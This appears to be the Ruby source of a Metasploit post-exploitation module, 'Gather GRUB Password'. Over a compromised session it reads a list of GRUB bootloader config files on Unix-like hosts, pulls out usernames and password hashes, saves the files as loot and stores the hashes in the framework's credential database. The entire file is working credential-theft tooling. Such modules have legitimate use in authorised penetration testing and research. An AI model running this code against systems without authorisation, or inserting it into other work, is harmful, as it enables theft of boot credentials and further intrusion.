##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Gather GRUB Password',
      'Description'  => %q(
        This module gathers GRUB passwords from GRUB bootloader config files.
      ),
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Garvit Dewan <d.garvit[at]gmail.com>' # @dgarvit
        ],
      'Platform'     => ['linux', 'osx', 'unix', 'solaris', 'bsd'],
      'SessionTypes' => ['meterpreter', 'shell'],
      'References'   => [ ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption'] ]
    ))
  end

  def parse_passwd_from_file(file)
    return unless readable?(file)

    print_status("Reading #{file}")

    idx = 0
    contents = read_file(file)
    contents.each_line do |line|
      next unless line.start_with?('password')

      pass_line = line.strip.split(' ')
      unless pass_line.length == 3
        print_status("Unknown Grub password convention. Printing line")
        print_status(line)
        next
      end

      convention = pass_line[0]
      case convention
      when 'password_pbkdf2'
        @creds_hash[pass_line[1]] = pass_line[2]
      when 'password'
        if pass_line[1].start_with?('--')
          @pass_hash[idx] = pass_line[2]
          idx += 1
        else
          @creds_hash[pass_line[1]] = pass_line[2]
        end
      else
        print_status("Unknown Grub password convention")
      end
    end

    file_loc = store_loot("grub.config", "text/plain", session, contents)
    print_good("#{file} saved to #{file_loc}")
  end

  def run
    @creds_hash = Hash.new
    @pass_hash = Hash.new

    targets = %w[
      /boot/grub/grub.conf
      /boot/grub/grub.cfg
      /boot/grub/menu.lst
      /boot/grub2/grub.cfg
      /boot/grub2/user.cfg
      /etc/grub.conf
      /etc/grub/grub.cfg
      /etc/grub.d/00_header
      /mnt/sysimage/boot/grub.conf
      /mnt/boot/grub/grub.conf
      /rpool/boot/grub/grub.cfg
    ]

    print_status("Searching for GRUB config files..")
    targets.each do |target|
      parse_passwd_from_file(target)
    end

    if @creds_hash && @pass_hash
      print_good("Found credentials")
    else
      print_status("No passwords found in GRUB config files")
    end

    cred_table = Rex::Text::Table.new(
      'Header'  =>  'Grub Credential Table',
      'Indent'  =>  1,
      'Columns' =>  [ 'Username', 'Password' ]
    )

    @creds_hash.each do |user, pass|
      credential_data = {
        origin_type:          :session,
        post_reference_name:  self.refname,
        private_type:         :nonreplayable_hash,
        private_data:         pass,
        session_id:           session_db_id,
        username:             user,
        workspace_id:         myworkspace_id
      }

      cred_table << [ user, pass ]
      create_credential(credential_data)
    end

    @pass_hash.each do |_index, pass|
      credential_data = {
        origin_type:          :session,
        post_reference_name:  self.refname,
        private_type:         :nonreplayable_hash,
        private_data:         pass,
        session_id:           session_db_id,
        username:             '',
        workspace_id:         myworkspace_id
      }

      cred_table << [ '', pass ]
      create_credential(credential_data)
    end

    print_line
    print_line(cred_table.to_s)
  end
end
